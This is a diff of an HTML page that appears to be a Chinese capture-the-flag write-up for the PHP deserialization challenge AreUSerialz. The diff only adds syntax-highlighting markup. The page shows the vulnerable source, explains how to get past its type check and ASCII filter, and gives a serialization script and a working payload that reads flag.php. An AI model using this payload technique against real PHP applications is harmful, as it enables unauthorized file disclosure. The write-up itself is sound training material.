@@ -228,87 +228,87 @@
             
             <div class="markdown-body">
               <h2 id="二十四、"><a href="#二十四、" class="headerlink" title="二十四、"></a>二十四、</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>[网鼎杯 2020 青龙组]AreUSerialz   </p>
-<div class="hljs"><pre><code>&lt;?php
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
-include(&quot;flag.php&quot;);
+<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
 
-highlight_file(__FILE__);
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
 
-class FileHandler &#123;
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;
 
-    protected $op;
-    protected $filename;
-    protected $content;
+    <span class="hljs-keyword">protected</span> $op;
+    <span class="hljs-keyword">protected</span> $filename;
+    <span class="hljs-keyword">protected</span> $content;
 
-    function __construct() &#123;
-        $op = &quot;1&quot;;
-        $filename = &quot;/tmp/tmpfile&quot;;
-        $content = &quot;Hello World!&quot;;
-        $this-&gt;process();
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
+        $op = <span class="hljs-string">&quot;1&quot;</span>;
+        $filename = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;
+        $content = <span class="hljs-string">&quot;Hello World!&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;process();
     &#125;
 
-    public function process() &#123;
-        if($this-&gt;op == &quot;1&quot;) &#123;
-            $this-&gt;write();
-        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;
-            $res = $this-&gt;read();
-            $this-&gt;output($res);
-        &#125; else &#123;
-            $this-&gt;output(&quot;Bad Hacker!&quot;);
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;
+            <span class="hljs-keyword">$this</span>-&gt;write();
+        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;
+            $res = <span class="hljs-keyword">$this</span>-&gt;read();
+            <span class="hljs-keyword">$this</span>-&gt;output($res);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);
         &#125;
     &#125;
 
-    private function write() &#123;
-        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;
-            if(strlen((string)$this-&gt;content) &gt; 100) &#123;
-                $this-&gt;output(&quot;Too long!&quot;);
-                die();
+    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;
+            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;
+                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);
+                <span class="hljs-keyword">die</span>();
             &#125;
-            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
-            if($res) $this-&gt;output(&quot;Successful!&quot;);
-            else $this-&gt;output(&quot;Failed!&quot;);
-        &#125; else &#123;
-            $this-&gt;output(&quot;Failed!&quot;);
+            $res = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);
+            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);
+            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);
         &#125;
     &#125;
 
-    private function read() &#123;
-        $res = &quot;&quot;;
-        if(isset($this-&gt;filename)) &#123;
-            $res = file_get_contents($this-&gt;filename);
+    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;
+        $res = <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;
+            $res = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);
         &#125;
-        return $res;
+        <span class="hljs-keyword">return</span> $res;
     &#125;
 
-    private function output($s) &#123;
-        echo &quot;[Result]: &lt;br&gt;&quot;;
-        echo $s;
+    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params">$s</span>) </span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;
+        <span class="hljs-keyword">echo</span> $s;
     &#125;
 
-    function __destruct() &#123;
-        if($this-&gt;op === &quot;2&quot;)
-            $this-&gt;op = &quot;1&quot;;
-        $this-&gt;content = &quot;&quot;;
-        $this-&gt;process();
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)
+            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;process();
     &#125;
 
 &#125;
 
-function is_valid($s) &#123;
-    for($i = 0; $i &lt; strlen($s); $i++)
-        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
-            return false;
-    return true;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$s</span>) </span>&#123;
+    <span class="hljs-keyword">for</span>($i = <span class="hljs-number">0</span>; $i &lt; strlen($s); $i++)
+        <span class="hljs-keyword">if</span>(!(ord($s[$i]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="hljs-number">125</span>))
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
 &#125;
 
-if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;
 
-    $str = (string)$_GET[&#39;str&#39;];
-    if(is_valid($str)) &#123;
+    $str = (<span class="hljs-keyword">string</span>)$_GET[<span class="hljs-string">&#x27;str&#x27;</span>];
+    <span class="hljs-keyword">if</span>(is_valid($str)) &#123;
         $obj = unserialize($str);
     &#125;
 
-&#125;    </code></pre></div>
+&#125;</code></pre></div></code></pre>
 <h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>一大段代码，很可怕<br>通过<code>read()</code>函数中的<code>file_get_contents</code>和<code>process()</code>函数中的<code> $this-&gt;output($res);</code><br>我们应该利用这个读取到<code>flag.php</code><br>传一个序列化的$str,filename=flag.php,调用read()函数需要op==”2”;而析构函数里有个</p>
 <div class="hljs"><pre><code>if($this-&gt;op === &quot;2&quot;)
      $this-&gt;op = &quot;1&quot;;     </code></pre></div>
@@ -320,18 +320,18 @@ if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;
     return true;
 &#125;    </code></pre></div>
 <p>这个要求$str的ASCII码必须在32~125之间<br>protected类在序列化后含有%00，其ASCII码为0<br>PHP7.1以上版本对属性类型不敏感，所以可以改成public类绕过       </p>
-<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><div class="hljs"><pre><code>&lt;?php 
-class FileHandler &#123;
+<h3 id="解"><a href="#解" class="headerlink" title="解"></a>解</h3><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;
 
-    public $op=2;
-    public $filename=&quot;flag.php&quot;;
-    public $content=&quot;hello&quot;;
+    <span class="hljs-keyword">public</span> $op=<span class="hljs-number">2</span>;
+    <span class="hljs-keyword">public</span> $filename=<span class="hljs-string">&quot;flag.php&quot;</span>;
+    <span class="hljs-keyword">public</span> $content=<span class="hljs-string">&quot;hello&quot;</span>;
 
 &#125;
-    $a=new FileHandler();
-    $b=serialize($a);
-    echo $b;
-?&gt;          </code></pre></div>
+	$a=<span class="hljs-keyword">new</span> FileHandler();
+	$b=serialize($a);
+	<span class="hljs-keyword">echo</span> $b;
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>payload：<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:5:&quot;hello&quot;;&#125;</code><br><img src="https://ftp.bmp.ovh/imgs/2021/02/7fca77026da21ca9.png" srcset="/img/loading.gif">  </p>
 <hr>
 <p>也可以使用伪协议  </p>
